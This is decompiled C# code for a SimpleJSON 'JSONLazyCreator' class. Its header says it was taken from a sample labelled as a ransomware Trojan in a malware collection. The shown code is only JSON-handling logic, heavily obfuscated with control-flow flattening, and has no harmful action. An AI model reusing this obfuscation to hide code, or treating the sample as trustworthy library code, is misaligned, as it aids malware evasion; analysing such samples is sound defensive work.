// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: PEFileEvidenceFacto, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 33D8CF26-6BC9-4426-B954-9C7650E72B0A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-09acaed1582d4f3da067862bc15fb60d54d8e65c2a64bd2432d354941daf716f.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
label_1:
      int num1 = -1382947125;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -698716007)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -742552620 ^ -1983458586;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 699810856 ^ -1798785203;
            continue;
          case 4:
            this.m_Node = aNode;
            this.m_Key = (string) null;
            num1 = (int) num2 * 163919579 ^ -1838043080;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
label_1:
      int num1 = -569684687;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -440644940)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.m_Node = aNode;
            this.m_Key = aKey;
            num1 = (int) num2 * 1583189190 ^ 1570825253;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void Set(JSONNode aVal)
    {
label_1:
      int num1 = 1241472503;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 308916146)) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = 607890136;
            continue;
          case 2:
            num1 = (int) num2 * -1620750122 ^ 1061608885;
            continue;
          case 3:
            this.m_Node = (JSONNode) null;
            num1 = 1412813269;
            continue;
          case 4:
            num1 = (int) num2 * 451845204 ^ 146614777;
            continue;
          case 5:
            int num3 = this.m_Key == null ? -164298452 : (num3 = -1713903829);
            num1 = num3 ^ (int) num2 * -1651768704;
            continue;
          case 6:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * 579974716 ^ -2040016290;
            continue;
          case 7:
            goto label_3;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    public override JSONNode this[int aIndex]
    {
      get => (JSONNode) new JSONLazyCreator((JSONNode) this);
      set
      {
        JSONArray aVal = new JSONArray();
        aVal.Add(value);
label_1:
        int num1 = 488541565;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 312687393)) % 5U)
          {
            case 0:
              goto label_3;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1268283155 ^ -142731006;
              continue;
            case 2:
              num1 = (int) num2 * -443537565 ^ -709364756;
              continue;
            case 3:
              num1 = (int) num2 * 1004789340 ^ 490647142;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get
      {
        JSONNode jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
label_1:
        int num1 = 1202569376;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1835570110)) % 3U)
          {
            case 1:
              num1 = (int) num2 * 88317201 ^ 384030479;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return jsonNode;
      }
      set
      {
        JSONClass aVal = new JSONClass();
label_1:
        int num1 = -1904478861;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1026950591)) % 5U)
          {
            case 0:
              num1 = (int) num2 * -1904293065 ^ 1357605927;
              continue;
            case 1:
              goto label_3;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 2000606022 ^ 249158237;
              continue;
            case 3:
              goto label_1;
            case 4:
              aVal.Add(aKey, value);
              num1 = (int) num2 * 647608416 ^ -1397131678;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public override void Add(JSONNode aItem)
    {
label_1:
      int num1 = 168164451;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 740885826)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            JSONArray aVal = new JSONArray();
            aVal.Add(aItem);
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * -15317646 ^ 959892983;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 458739091 ^ 642974657;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public override void Add(string aKey, JSONNode aItem)
    {
label_1:
      int num1 = -941396713;
      JSONClass aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1318633481)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            aVal = new JSONClass();
            aVal.Add(aKey, aItem);
            num1 = (int) num2 * -625983122 ^ -526238972;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1877544652 ^ -254683225;
            continue;
          case 4:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * 76458804 ^ 1459111007;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = 1569509933;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 642193498)) % 8U)
        {
          case 0:
            flag2 = true;
            num1 = (int) num2 * -741615131 ^ -1225988501;
            continue;
          case 1:
            num1 = (int) num2 * -401665458 ^ 1989788686;
            continue;
          case 3:
            num1 = (int) num2 * -58785424 ^ 1770833536;
            continue;
          case 4:
            int num3 = flag1 ? -10910822 : (num3 = -802130817);
            num1 = num3 ^ (int) num2 * -1104850902;
            continue;
          case 5:
            flag2 = (object) a == b;
            num1 = 1589604089;
            continue;
          case 6:
            goto label_1;
          case 7:
            flag1 = b == null;
            num1 = (int) num2 * 1052990640 ^ 694775790;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return flag2;
    }

    public static bool operator !=(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = 1250823184;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 25512597)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            flag = !(a == b);
            num1 = (int) num2 * 1727763013 ^ -672886963;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return flag;
    }

    public override bool Equals(object obj)
    {
      bool flag1 = obj == null;
label_1:
      int num1 = -2068276353;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1520103103)) % 7U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 868303110 ^ 1909320533;
            continue;
          case 3:
            flag2 = true;
            num1 = (int) num2 * 1451982985 ^ -81767681;
            continue;
          case 4:
            int num3 = flag1 ? -5227285 : (num3 = -648037855);
            num1 = num3 ^ (int) num2 * -743708694;
            continue;
          case 5:
            flag2 = (object) this == obj;
            num1 = -995931902;
            continue;
          case 6:
            num1 = (int) num2 * 1710115212 ^ -302476889;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return flag2;
    }

    public override int GetHashCode()
    {
      int hashCode = base.GetHashCode();
label_1:
      int num1 = -1115396223;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -840170604)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 639383375 ^ -1854700571;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return hashCode;
    }

    public override string ToString() => "";

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = -237343107;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -315190565)) % 3U)
        {
          case 1:
            str = "";
            num1 = (int) num2 * -1291134240 ^ -542281732;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    public override int AsInt
    {
      get
      {
label_1:
        int num1 = 44177749;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 960884183)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 1507566679 ^ 1375895546;
              continue;
            case 2:
              asInt = 0;
              num1 = (int) num2 * -1934688023 ^ 2819073;
              continue;
            case 4:
              this.Set((JSONNode) new JSONData(0));
              num1 = (int) num2 * 1731374386 ^ -466360679;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asInt;
      }
      set
      {
        this.Set((JSONNode) new JSONData(value));
label_1:
        int num1 = -706604408;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1104020089)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              num1 = (int) num2 * 665960570 ^ 322413307;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override float AsFloat
    {
      get
      {
        JSONData aVal = new JSONData(0.0f);
label_1:
        int num1 = 1519536973;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1020333820)) % 6U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1589297480 ^ 1002720370;
              continue;
            case 2:
              num1 = (int) num2 * 1589548029 ^ 1488089436;
              continue;
            case 3:
              goto label_1;
            case 4:
              num1 = (int) num2 * -309954341 ^ 459302861;
              continue;
            case 5:
              asFloat = 0.0f;
              num1 = (int) num2 * 420703739 ^ 1531941083;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return asFloat;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = -2127231417;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -191130848)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -494076488 ^ 818595310;
              continue;
            case 2:
              goto label_3;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 2105677573 ^ -1558670358;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override double AsDouble
    {
      get
      {
label_1:
        int num1 = 2107950354;
        double asDouble;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 717551009)) % 7U)
          {
            case 0:
              asDouble = 0.0;
              num1 = (int) num2 * 246942107 ^ 1305448401;
              continue;
            case 2:
              goto label_1;
            case 3:
              num1 = (int) num2 * -1055761797 ^ -52312578;
              continue;
            case 4:
              num1 = (int) num2 * 442557690 ^ 2037709371;
              continue;
            case 5:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 37413955 ^ 731631595;
              continue;
            case 6:
              aVal = new JSONData(0.0);
              num1 = (int) num2 * 2144907535 ^ -91885244;
              continue;
            default:
              goto label_8;
          }
        }
label_8:
        return asDouble;
      }
      set
      {
label_1:
        int num1 = -526519755;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -362610700)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(value);
              num1 = (int) num2 * -2130102974 ^ -1984924888;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1371409538 ^ -1900380437;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override bool AsBool
    {
      get
      {
label_1:
        int num1 = 1407437483;
        JSONData aVal;
        bool asBool;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2054464736)) % 5U)
          {
            case 0:
              asBool = false;
              num1 = (int) num2 * 1379441483 ^ -997704186;
              continue;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1667041879 ^ 1653282919;
              continue;
            case 2:
              aVal = new JSONData(false);
              num1 = (int) num2 * 829188412 ^ -1503855839;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        return asBool;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override JSONArray AsArray
    {
      get
      {
label_1:
        int num1 = 535722878;
        JSONArray aVal;
        JSONArray asArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1985773602)) % 6U)
          {
            case 0:
              num1 = (int) num2 * 751168121 ^ 490822317;
              continue;
            case 2:
              aVal = new JSONArray();
              num1 = (int) num2 * 1840547920 ^ 1557949341;
              continue;
            case 3:
              asArray = aVal;
              num1 = (int) num2 * -1230021229 ^ -308357783;
              continue;
            case 4:
              goto label_1;
            case 5:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 661882200 ^ -849813301;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
        JSONClass aVal = new JSONClass();
        this.Set((JSONNode) aVal);
label_1:
        int num1 = 54751945;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1311784385)) % 5U)
          {
            case 0:
              asObject = aVal;
              num1 = (int) num2 * 2040753520 ^ -1072454275;
              continue;
            case 1:
              num1 = (int) num2 * 1590722571 ^ -664942988;
              continue;
            case 2:
              goto label_1;
            case 4:
              num1 = (int) num2 * -1254566345 ^ -1310565515;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asObject;
      }
    }
  }
}
